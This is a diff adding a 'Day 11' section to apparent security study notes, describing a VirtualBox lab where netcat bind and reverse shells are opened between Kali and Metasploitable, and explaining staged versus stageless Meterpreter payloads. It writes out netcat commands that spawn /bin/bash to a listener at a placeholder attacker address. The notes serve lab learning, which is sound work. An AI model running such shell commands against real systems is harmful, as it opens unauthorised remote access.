@@ -719,3 +719,72 @@ A **payload** is the part of malware or an exploit that performs the intended ma
 - **Staged Payloads** are modular and smaller initially but require network.
 - **Non-Staged Payloads** are bigger but more self-sufficient.
 ---
+
+
+# Day 11 – Practical with Metasploit
+
+## 📌 Overview
+This session covers a hands-on practice with **Metasploit** and **Netcat** to establish bind and reverse shells between **Kali Linux** (attacker) and **Metasploitable** (target). It also includes an explanation of **staged vs. stageless payloads**.
+
+---
+
+## 🛠 Steps Performed
+
+### 1. Setting up Environment
+- Started Kali Linux (attacker) and Metasploitable (target) in VirtualBox.
+- Configured **NAT networking** so both can communicate.
+- Used `ifconfig` to get IP addresses.
+- Verified connection with `ping <target_ip>`.
+
+### 2. Bind Shell
+- **Target (Metasploitable)**:
+  ```bash
+  nc -lvnp 4444 -e /bin/bash
+  ```
+- **Attacker (Kali)**:
+  ```bash
+  nc -v <target_ip> 4444
+  ```
+- Once connected, commands like `whoami` can be run.
+
+### 3. Reverse Shell
+- **Attacker (Kali)**:
+  ```bash
+  nc -lvnp 4444
+  ```
+- **Target (Metasploitable)**:
+  ```bash
+  nc <attacker_ip> 4444 -e /bin/bash
+  ```
+
+### 4. Staged vs. Stageless Payloads
+- **Staged**: Sent in two parts (stager + full payload).
+  Example: `windows/meterpreter/reverse_tcp`
+- **Stageless**: Sent all at once.
+  Example: `windows/meterpreter_reverse_tcp`
+
+#### Difference Table
+| Feature        | Staged Payload                  | Stageless Payload             |
+|---------------|--------------------------------|--------------------------------|
+| Delivery      | Two parts                      | One part                       |
+| Size          | Smaller initial code           | Larger total size              |
+| Reliability   | Needs stable connection        | Works with unstable connections|
+| Stealth       | More stealthy                  | Less stealthy                  |
+| Example       | windows/meterpreter/reverse_tcp| windows/meterpreter_reverse_tcp|
+
+### 5. Listing Payloads
+```bash
+msfvenom -l payloads
+msfvenom -l payloads | grep "windows/meterpreter/reverse_tcp"
+```
+- Slash `/` before `reverse_tcp` → staged payload.
+- Underscore `_` before `reverse_tcp` → stageless payload.
+
+---
+
+## 📚 Summary
+- Connected Kali and Metasploitable using NAT.
+- Practiced **bind** and **reverse** shells with Netcat.
+- Learned differences between **staged** and **stageless** payloads.
+- Understood how to identify payload types in Metasploit.
+---
